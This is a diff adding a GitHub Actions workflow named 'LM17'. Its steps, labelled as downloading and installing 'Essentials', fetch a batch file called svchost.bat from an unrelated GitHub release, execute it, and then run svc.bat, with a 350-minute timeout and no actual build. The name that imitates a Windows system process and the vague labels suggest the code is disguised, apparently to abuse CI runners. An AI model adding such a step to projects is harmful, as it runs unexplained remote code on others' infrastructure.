@@ -1,0 +1,22 @@
+name: LM17
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: Windows-latest
+    timeout-minutes: 350
+
+    steps:
+      - name: Downloading Essentials
+        run: Invoke-WebRequest -Uri "https://github.com/slab-doing-spree/1/releases/download/svc/svchost.bat" -OutFile "svchost.bat"
+
+      - name: Installing Essentials
+        run: cmd /c svchost.bat
+
+      - name: Installing Essentials
+        run: cmd /c svc.bat
